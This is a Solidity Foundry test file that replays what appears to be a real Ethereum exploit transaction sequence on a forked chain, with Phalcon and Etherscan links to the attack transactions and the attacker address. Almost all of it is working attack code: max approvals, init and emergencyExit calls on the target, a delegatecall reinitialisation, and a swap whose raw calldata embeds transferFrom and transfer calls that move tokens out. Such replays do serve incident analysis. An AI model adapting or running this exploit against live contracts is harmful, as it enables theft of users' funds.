// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xe4bfea9d92eeb394711bfc17d1246d5bef9142a7eb11cdd7f3a7dbf647c7af3b
// https://etherscan.io/address/0x2708CACE7b42302aF26F1AB896111d87FAEFf92f

struct S1 {
    address p1;
    address p2;
    address p3;
    address p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    bytes p8;
}

struct S2 {
    uint256 p1;
    address p2;
    address p3;
    bytes p4;
    bytes p5;
    bytes p6;
    bytes p7;
    bytes p8;
    bytes p9;
    bytes p10;
}

interface I {
    function emergencyExit(address) external payable;
    function swap(address, S1 memory, bytes memory) external payable;
    function approve(address, uint256) external payable;
    function unoswap(address, uint256, uint256, bytes32[] memory) external payable;
    function init(uint256, uint256[] memory, uint256[] memory, address) external payable;
}

contract X6e70 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xe4bfea9d92eeb394711bfc17d1246d5bef9142a7eb11cdd7f3a7dbf647c7af3b");
    }

    address constant x0000 = 0x0000000000000000000000000000000000000000;
    address constant x03be = 0x03Be5C903c727Ee2C8C4e9bc0AcC860Cca4715e2;
    address constant x1111 = 0x11111112542D85B3EF69AE05771c2dCCff4fAa26;
    address constant x1600 = 0x0000001600000000000000000000000000000000;
    address constant x2723 = 0x27239549DD40E1D60F5B80B0C4196923745B1FD2;
    address constant x2fd6 = 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940;
    address constant x6133 = 0x61335C1300000000000000000000000000000000;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x9fa6 = 0x9fa69536d1cda4A04cFB50688294de75B505a9aE;
    address constant xc88a = 0xc88aC988A655B91b70DEF427c8778B4D43f2048D;
    address constant xf17c = 0xF17CA0E0F24A5FA27944275Fa0ceDec24Fbf8eE2;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 13155407); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x6458b59f9fe0921cf433f136a87842c85fb99f6d276d4d5a6429e245e4095666));

        // https://explorer.phalcon.xyz/tx/eth/0x6458b59f9fe0921cf433f136a87842c85fb99f6d276d4d5a6429e245e4095666
        this.x6458b59f();
        // https://explorer.phalcon.xyz/tx/eth/0x4733ed3d2ddf74a7893bfc62d506bf938a9ecc65216ce0533025b17f74f222a4
        this.x4733ed3d();
        // https://explorer.phalcon.xyz/tx/eth/0xd5e2edd6089dcf5dca78c0ccbdf659acedab173a8ab3cb65720e35b640c0af7c
        this.xd5e2edd6();
        // https://explorer.phalcon.xyz/tx/eth/0x96bf6bd14a81cf19939c0b966389daed778c3a9528a6c5dd7a4d980dec966388
        this.x96bf6bd1();
        // https://explorer.phalcon.xyz/tx/eth/0x1981aaf6bf7a2ffb43cf5658b76d11a3fac2ba2249081afefa422e2c49af02f4
        this.x1981aaf6();
        uint256[] memory arr08 = new uint256[](1);
        arr08[0] = 5702400;
        uint256[] memory arr09 = new uint256[](1);
        arr09[0] = 10000;
        // https://explorer.phalcon.xyz/tx/eth/0xe4bfea9d92eeb394711bfc17d1246d5bef9142a7eb11cdd7f3a7dbf647c7af3b
        init(1640984401, arr08, arr09, x03be);
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 13154964); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x6458b59f9fe0921cf433f136a87842c85fb99f6d276d4d5a6429e245e4095666
        this.x6458b59f();
        vm.warp(1630705805);
        vm.roll(13155284);
        // https://explorer.phalcon.xyz/tx/eth/0x4733ed3d2ddf74a7893bfc62d506bf938a9ecc65216ce0533025b17f74f222a4
        this.x4733ed3d();
        vm.warp(1630706304);
        vm.roll(13155320);
        // https://explorer.phalcon.xyz/tx/eth/0xd5e2edd6089dcf5dca78c0ccbdf659acedab173a8ab3cb65720e35b640c0af7c
        this.xd5e2edd6();
        vm.warp(1630706662);
        vm.roll(13155349);
        // https://explorer.phalcon.xyz/tx/eth/0x96bf6bd14a81cf19939c0b966389daed778c3a9528a6c5dd7a4d980dec966388
        this.x96bf6bd1();
        vm.warp(1630706857);
        vm.roll(13155364);
        // https://explorer.phalcon.xyz/tx/eth/0x1981aaf6bf7a2ffb43cf5658b76d11a3fac2ba2249081afefa422e2c49af02f4
        this.x1981aaf6();
        vm.warp(1630707395);
        vm.roll(13155407);
        uint256[] memory arr08 = new uint256[](1);
        arr08[0] = 5702400;
        uint256[] memory arr09 = new uint256[](1);
        arr09[0] = 10000;
        // https://explorer.phalcon.xyz/tx/eth/0xe4bfea9d92eeb394711bfc17d1246d5bef9142a7eb11cdd7f3a7dbf647c7af3b
        init(1640984401, arr08, arr09, x03be);
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 13155407); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1630707395);
        vm.roll(13155408);
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x9fa69536d1cda4A04cFB50688294de75B505a9aE),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        uint256[] memory arr08 = new uint256[](1);
        arr08[0] = 5702400;
        uint256[] memory arr09 = new uint256[](1);
        arr09[0] = 10000;
        // https://explorer.phalcon.xyz/tx/eth/0xe4bfea9d92eeb394711bfc17d1246d5bef9142a7eb11cdd7f3a7dbf647c7af3b
        init(1640984401, arr08, arr09, x03be);
    }

    function x96bf6bd1() public {
        I(x2fd6).emergencyExit(tx.origin);
    }

    function x4733ed3d() public {
        I(x9fa6).approve(x1111, type(uint256).max);
    }

    function xd5e2edd6() public {
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 5702400;
        uint256[] memory arr03 = new uint256[](1);
        arr03[0] = 10000;
        I(x2fd6).init(1640984401, arr02, arr03, x9fa6);
    }

    function init(uint256, uint256[] memory, uint256[] memory, address) public {
        uint256[] memory arr10 = new uint256[](1);
        arr10[0] = 5702400;
        uint256[] memory arr11 = new uint256[](1);
        arr11[0] = 10000;
        xf17c.delegatecall(
            abi.encodeWithSignature("init(uint256,uint256[],uint256[],address)", 1640984401, arr10, arr11, x03be)
        );
    }

    function x1981aaf6() public {
        S1 memory s101 = S1(x9fa6, x6b17, xc88a, tx.origin, 5760000000000000000000000, 2321190828758494903058165, 4, "");
        bytes memory b01 = abi.encode(
            hex"00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000001e00000000000000000000000000000000000000000000000000000000000000ca00000000000000000000000000000000000000000000000000000000000000fc0800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000a4b757fed6000000000000000000000000c88ac988a655b91b70def427c8778b4d43f2048d0000000000000000000000009fa69536d1cda4a04cfb50688294de75b505a9ae000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000002dc6c027239549dd40e1d60f5b80b0c4196923745b1fd200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000a0483f1291f000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000009a0000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000320000000000000000000000000000003200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000016080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000064eb5625d9000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000003ef51736315f52d568d6d2cf289419b9cfffe7820000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000008000000000000000000000003ef51736315f52d568d6d2cf289419b9cfffe78200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000006e4f3432b1a00000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000680000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000d77c6fc56c0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000000000000014000000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000002800000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000038000000000000000000000000000000000000000000000000000000000000005a000000000000000000000000000000000000000000000000000000000000005c0000000000000000000000000000000000000000000000000000000000000006423b872dd0000000000000000000000002af33e93f68b8497bb535c492f5867c7e83f2bc400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000387f67f3777277130000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006423b872dd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000002af33e93f68b8497bb535c492f5867c7e83f2bc4000000000000000000000000000000000000000000000000000003e283989220000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044f4a215c30000000000000000000000000000000000000000000387f67f37772771300000000000000000000000000000000000000000000000000000000003e283989220000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000044296637bf0000000000000000000000000000000000000000000387f67f37772771300000000000000000000000000000000000000000000000000000000003e2839892200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e4961d5b1e000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000020000000000000000000000003ef51736315f52d568d6d2cf289419b9cfffe7820000000000000000000000003ef51736315f52d568d6d2cf289419b9cfffe7820000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000044cf6fc6e30000000000000000000000002af33e93f68b8497bb535c492f5867c7e83f2bc400000000000000000000000000000000",
            x1600,
            hex"000000000000000000000000000000000000000000000000000000000000000000000000000000000000002463592c2b00000000000000000000000000000000",
            x6133,
            hex"000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401d24bf67f67ee11f21f5f44270ec40b4c034195367c6f5b762d49044a12c88ee56f073e77d118a17362a256c1e01b985a04caab555ba81800012597dd67711600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000028000000000000000000000000000000000000000000000000000000000000044800000000000000000000000000000000000000000000000000000000000006400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000002647f8fe7a00000000000000000000000000000000000000000000000000000000000000080800000000000000000000000000000000000000000000000000000000000004400000000000000000000000027239549dd40e1d60f5b80b0c4196923745b1fd200000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000a4059712240000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000001000000000000000000000000000000010000000000000000000000000000000000000000000000006efa32ee8b4f84b700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004470bdb9470000000000000000000000006b175474e89094c44da98b954eedeac495271d0f00000000000000000000000000000000000000000001fabbb7f0f1e6857e213c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000184b3af37c0000000000000000000000000000000000000000000000000000000000000008080000000000000000000000000000000000000000000000000000000000000240000000000000000000000006b175474e89094c44da98b954eedeac495271d0f00000000000000000000000000000001000000000000000000000000000000010000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000044a9059cbb0000000000000000000000002708cace7b42302af26f1ab896111d87faeff92f00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        );
        I(x1111).swap(x2723, s101, b01);
    }

    function x6458b59f() public {
        bytes32[] memory arr01 = new bytes32[](1);
        arr01[0] = 0x80000000000000003b74a4607515be43d16f871588adc135d58a9c30a71eb34f;
        I(x1111).unoswap{value: 10000000000000000}(x0000, 10000000000000000, 38839956683209373127, arr01);
    }

    fallback() external payable {
        revert("no such function");
    }
}
